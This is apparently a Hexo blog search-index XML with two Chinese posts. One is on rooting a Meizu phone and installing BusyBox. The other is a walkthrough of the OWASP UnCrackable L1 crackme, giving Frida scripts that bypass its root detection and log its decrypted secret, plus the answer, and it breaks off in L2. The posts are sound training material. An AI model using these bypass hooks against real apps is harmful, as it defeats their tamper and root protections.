<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Flyme root获取及一些实用shell命令工具安装</title>
    <link href="/blog/2023/12/24/Flyme-root%E8%8E%B7%E5%8F%96%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8shell%E5%91%BD%E4%BB%A4%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/"/>
    <url>/blog/2023/12/24/Flyme-root%E8%8E%B7%E5%8F%96%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8shell%E5%91%BD%E4%BB%A4%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><strong>前几天玩Android的时候都是用的模拟器去搞的，想试试真机条件下的一些分析，这样就可以调试分析只有arm版本的so文件的APP了。手上刚好有前几年买的魅族，记一下root的过程。</strong>（打游戏看到了小彩蛋，HAPPY CHRISTMAS</p><p><img src="/images/image-20231225141416136.png"></p><span id="more"></span><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>当前系统版本 Flyme8，直接点击设置-&gt;安全（指纹和安全）-&gt;ROOT权限，会要求在官网申请权限，然而稳定版系统又不能申请</p><p>于是直接下载升级包，降级到Flyme6.3.0.0的版本</p><p>将update.zip直接复制到手机，然后点击即可自动重启安装系统，降级会导致清除所有数据，请做好备份</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>点击设置-&gt;指纹和安全-&gt;ROOT权限，输入账号密码之后即可自动重启获得root权限</p><p>点击设置-&gt;关于手机-&gt;详情 里面有版本号，点击版本号多次开启开发者选项，打开USB调试</p><p>adb shell 进入，然后运行su，在手机上确认允许shell获取root权限即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">:/ $ su<br>enter main<br>start <span class="hljs-built_in">command</span> :am start -a android.intent.action.MAIN -n com.android.settings/com.meizu.settings.root.FlymeRootRequestActivity --ei uid 2000 --ei pid 5156 &gt; /dev/null<br>:/ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="Busy-Box"><a href="#Busy-Box" class="headerlink" title="Busy Box"></a>Busy Box</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>BusyBox将许多常见UNIX实用程序的小版本组合成一个小的可执行程序。它提供了您通常在GNU fileutils、shellutils等中找到的大多数实用程序的替代品。BusyBox中的实用程序通常比功能齐全的GNU同类工具的选项要少。但其中包含的选项提供了预期的功能，其行为与GNU对应的选项非常相似。BusyBox为任何小型或嵌入式系统提供了一个相当完整的环境。</p><p>源代码：<a href="https://github.com/meefik/busybox"><a href="https://git.busybox.net/busybox/tree/?h=1_36_stable">busybox - BusyBox: The Swiss Army Knife of Embedded Linux</a></a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>由于Flyme中很多Linux命令都没有，因此可以使用busybox安装一些Linux常用命令：</p><ol><li><p>根据架构下载二进制文件：<a href="https://busybox.net/downloads/binaries/">Index of &#x2F;downloads&#x2F;binaries (busybox.net)</a></p></li><li><p>例如armv8可以直接点击1.31.0-defconfig-multiarch-musl-&gt;busybox-armv8l 下载即可</p></li><li><p>下载之后使用adb push上传到手机，具体命令为<code>adb push path/to/source path/to/destination</code></p></li><li><p>开启&#x2F;system&#x2F;挂载点的可写权限，<code>mount -o rw,remount /system</code>，（改回来的命令是<code>mount -o ro,remount /system</code>）</p></li><li><p>将busybox文件移动到&#x2F;system&#x2F;xbin&#x2F;目录下，然后赋予可执行权限：<code>chmod 755 busybox</code></p></li><li><p>然后切换到&#x2F;system&#x2F;xbin&#x2F;目录运行busybox：<code>./busybox --install ./</code></p></li><li><p>最后将&#x2F;system&#x2F;挂载点的权限改回来：<code>mount -o ro,remount /system</code></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP Android UnCrackable系列练习记录</title>
    <link href="/blog/2023/12/06/OWASP-Android-UnCrackable%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/blog/2023/12/06/OWASP-Android-UnCrackable%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>前一阵子学习了一些简单的APP逆向分析技术，以及使用Frida进行对关键逻辑挂钩子修改获取一些数值，现在针对学习过的东西做一下实践，尝试破解一下<a href="https://mas.owasp.org/crackmes/">MAS Crackmes - OWASP Mobile Application Security</a>。</p><p><img src="/images/image-20231207221728531.png"></p><span id="more"></span><h2 id="Android-UnCrackable-L1"><a href="#Android-UnCrackable-L1" class="headerlink" title="Android UnCrackable L1"></a>Android UnCrackable L1</h2><h3 id="分析逻辑"><a href="#分析逻辑" class="headerlink" title="分析逻辑"></a>分析逻辑</h3><p>模拟器安装app：</p><p><img src="/images/image-20231206153045187.png"></p><p>提示检测到了root环境，点击ok就会自动退出。</p><p>jadx一键分析，可以得到如下代码：</p><h4 id="sg-vantagepoint-uncrackable1-MainActivity："><a href="#sg-vantagepoint-uncrackable1-MainActivity：" class="headerlink" title="sg.vantagepoint.uncrackable1.MainActivity："></a>sg.vantagepoint.uncrackable1.MainActivity：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.uncrackable1;<br><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.app.AlertDialog;<br><span class="hljs-keyword">import</span> android.content.DialogInterface;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> owasp.mstg.uncrackable1.R;<br><span class="hljs-keyword">import</span> sg.vantagepoint.a.b;<br><span class="hljs-keyword">import</span> sg.vantagepoint.a.c;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">AlertDialog</span> <span class="hljs-variable">create</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>).create();<br>        create.setTitle(str);<br>        create.setMessage(<span class="hljs-string">&quot;This is unacceptable. The app is now going to exit.&quot;</span>);<br>        create.setButton(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable1.MainActivity.1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(DialogInterface dialogInterface, <span class="hljs-type">int</span> i)</span> &#123;<br>                System.exit(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;);<br>        create.setCancelable(<span class="hljs-literal">false</span>);<br>        create.show();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.app.Activity</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle bundle)</span> &#123;<br>        <span class="hljs-keyword">if</span> (c.a() || c.b() || c.c()) &#123;<br>            a(<span class="hljs-string">&quot;Root detected!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (b.a(getApplicationContext())) &#123;<br>            a(<span class="hljs-string">&quot;App is debuggable!&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">super</span>.onCreate(bundle);<br>        setContentView(R.layout.activity_main);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(View view)</span> &#123;<br>        String str;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ((EditText) findViewById(R.id.edit_text)).getText().toString();<br>        <span class="hljs-type">AlertDialog</span> <span class="hljs-variable">create</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>).create();<br>        <span class="hljs-keyword">if</span> (a.a(obj)) &#123;<br>            create.setTitle(<span class="hljs-string">&quot;Success!&quot;</span>);<br>            str = <span class="hljs-string">&quot;This is the correct secret.&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            create.setTitle(<span class="hljs-string">&quot;Nope...&quot;</span>);<br>            str = <span class="hljs-string">&quot;That&#x27;s not it. Try again.&quot;</span>;<br>        &#125;<br>        create.setMessage(str);<br>        create.setButton(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable1.MainActivity.2</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(DialogInterface dialogInterface, <span class="hljs-type">int</span> i)</span> &#123;<br>                dialogInterface.dismiss();<br>            &#125;<br>        &#125;);<br>        create.show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是APP的主逻辑，首先对设备root状态进行检测，如果c.a()、c.b()、c.c()任意一个返回true就认定为设备已经被root就会退出，然后有一个verify方法调用了a.a(obj)，如果a.a(obj)返回true就认为secret正确，那么本次分析的主逻辑就是先去除root检测，然后再找到secret即可。</p><h4 id="sg-vantagepoint-uncrackable1-a："><a href="#sg-vantagepoint-uncrackable1-a：" class="headerlink" title="sg.vantagepoint.uncrackable1.a："></a>sg.vantagepoint.uncrackable1.a：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.uncrackable1;<br><br><span class="hljs-keyword">import</span> android.util.Base64;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">byte</span>[] bArr;<br>        <span class="hljs-type">byte</span>[] bArr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">try</span> &#123;<br>            bArr = sg.vantagepoint.a.a.a(b(<span class="hljs-string">&quot;8d127684cbc37c17616d806cf50473cc&quot;</span>), Base64.decode(<span class="hljs-string">&quot;5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=&quot;</span>, <span class="hljs-number">0</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log.d(<span class="hljs-string">&quot;CodeCheck&quot;</span>, <span class="hljs-string">&quot;AES error:&quot;</span> + e.getMessage());<br>            bArr = bArr2;<br>        &#125;<br>        <span class="hljs-keyword">return</span> str.equals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bArr));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] b(String str) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> str.length();<br>        <span class="hljs-type">byte</span>[] bArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[length / <span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i += <span class="hljs-number">2</span>) &#123;<br>            bArr[i / <span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((Character.digit(str.charAt(i), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>) + Character.digit(str.charAt(i + <span class="hljs-number">1</span>), <span class="hljs-number">16</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> bArr;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是判断输入的信息与原始AES加密的信息是否一致的方法，到智利其实已经给出了密文和密钥，直接去破译secret应该也可以，不过我们既然是实践frida就继续分析下去吧。</p><h4 id="sg-vantagepoint-a-a："><a href="#sg-vantagepoint-a-a：" class="headerlink" title="sg.vantagepoint.a.a："></a>sg.vantagepoint.a.a：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.a;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] a(<span class="hljs-type">byte</span>[] bArr, <span class="hljs-type">byte</span>[] bArr2) &#123;<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(bArr, <span class="hljs-string">&quot;AES/ECB/PKCS7Padding&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>        cipher.init(<span class="hljs-number">2</span>, secretKeySpec);<br>        <span class="hljs-keyword">return</span> cipher.doFinal(bArr2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个就是上面sg.vantagepoint.uncrackable1.a中调用的解密的方法。</p><h4 id="sg-vantagepoint-a-b："><a href="#sg-vantagepoint-a-b：" class="headerlink" title="sg.vantagepoint.a.b："></a>sg.vantagepoint.a.b：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.a;<br><br><span class="hljs-keyword">import</span> android.content.Context;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-keyword">return</span> (context.getApplicationContext().getApplicationInfo().flags &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主逻辑里面调用用来判断是否处于调试状态的代码</p><h4 id="sg-vantagepoint-a-c："><a href="#sg-vantagepoint-a-c：" class="headerlink" title="sg.vantagepoint.a.c："></a>sg.vantagepoint.a.c：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.a;<br><br><span class="hljs-keyword">import</span> android.os.Build;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">c</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (String str : System.getenv(<span class="hljs-string">&quot;PATH&quot;</span>).split(<span class="hljs-string">&quot;:&quot;</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(str, <span class="hljs-string">&quot;su&quot;</span>).exists()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">b</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> Build.TAGS;<br>        <span class="hljs-keyword">return</span> str != <span class="hljs-literal">null</span> &amp;&amp; str.contains(<span class="hljs-string">&quot;test-keys&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">c</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (String str : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/system/app/Superuser.apk&quot;</span>, <span class="hljs-string">&quot;/system/xbin/daemonsu&quot;</span>, <span class="hljs-string">&quot;/system/etc/init.d/99SuperSUDaemon&quot;</span>, <span class="hljs-string">&quot;/system/bin/.ext/.su&quot;</span>, <span class="hljs-string">&quot;/system/etc/.has_su_daemon&quot;</span>, <span class="hljs-string">&quot;/system/etc/.installed_su_daemon&quot;</span>, <span class="hljs-string">&quot;/dev/com.koushikdutta.superuser.daemon/&quot;</span>&#125;) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(str).exists()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面提到的用于判断是否Root的代码。</p><h3 id="Frida挂钩子"><a href="#Frida挂钩子" class="headerlink" title="Frida挂钩子"></a>Frida挂钩子</h3><h4 id="绕过Root检测"><a href="#绕过Root检测" class="headerlink" title="绕过Root检测"></a>绕过Root检测</h4><p>根据上面的分析，我们只需要将三个检测root特征的函数全部返回false即可，因此我们就可以编写如下frida脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.a.c&#x27;</span>);<br>    func.<span class="hljs-property">a</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.<span class="hljs-property">b</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">c</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>运行脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frida -U -f owasp.mstg.uncrackable1 -l frida_script.js<br></code></pre></td></tr></table></figure><p><img src="/images/image-20231206152729115.png"></p><p>我们可以看到原本检测到了root的界面就消失了，不会自动退出。</p><h3 id="获取secret"><a href="#获取secret" class="headerlink" title="获取secret"></a>获取secret</h3><p>根据上面的分析，我们只需要在调用<code>sg.vantagepoint.a.a.a</code>方法的时候勾取返回值输出即可，因此可以继续完善我们的最终脚本如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.a.c&#x27;</span>);<br>    func.<span class="hljs-property">a</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.<span class="hljs-property">b</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">c</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br><span class="hljs-comment">//var func1 = Java.use(&#x27;sg.vantagepoint.uncrackable1.a&#x27;);</span><br><span class="hljs-comment">//func1.a.implementation = function(str) &#123;</span><br>    <span class="hljs-comment">//    return true;</span><br>    <span class="hljs-comment">//&#125;;</span><br><span class="hljs-keyword">var</span> func2 = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.a.a&#x27;</span>);<br>func2.<span class="hljs-property">a</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">str1, str2</span>) &#123;<br><span class="hljs-keyword">var</span> res = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">a</span>(str1, str2);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>执行脚本后，随意输入字符点击VERIFY</p><p><img src="/images/image-20231206154230807.png"></p><p>虽然是错误的，但是我们可以在控制台看到正确的字节序列</p><p>最终的执行结果打印出的数据如下：</p><p><code>[SM-N976N::owasp.mstg.uncrackable1 ]-&gt; 73,32,119,97,110,116,32,116,111,32,98,101,108,105,101,118,101</code></p><p>我们使用python将字节数组转换一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">73</span>,<span class="hljs-number">32</span>,<span class="hljs-number">119</span>,<span class="hljs-number">97</span>,<span class="hljs-number">110</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">32</span>,<span class="hljs-number">98</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">101</span>]).decode())<br>I want to believe<br></code></pre></td></tr></table></figure><p>最终结果就是<code>I want to believe</code>：</p><p><img src="/images/image-20231206154637800.png"></p><h2 id="Android-UnCrackable-L2"><a href="#Android-UnCrackable-L2" class="headerlink" title="Android UnCrackable L2"></a>Android UnCrackable L2</h2><h3 id="分析逻辑-1"><a href="#分析逻辑-1" class="headerlink" title="分析逻辑"></a>分析逻辑</h3><p>Root检测和调试检测与L1中相同，这里就不再冗余分析了。</p><h4 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 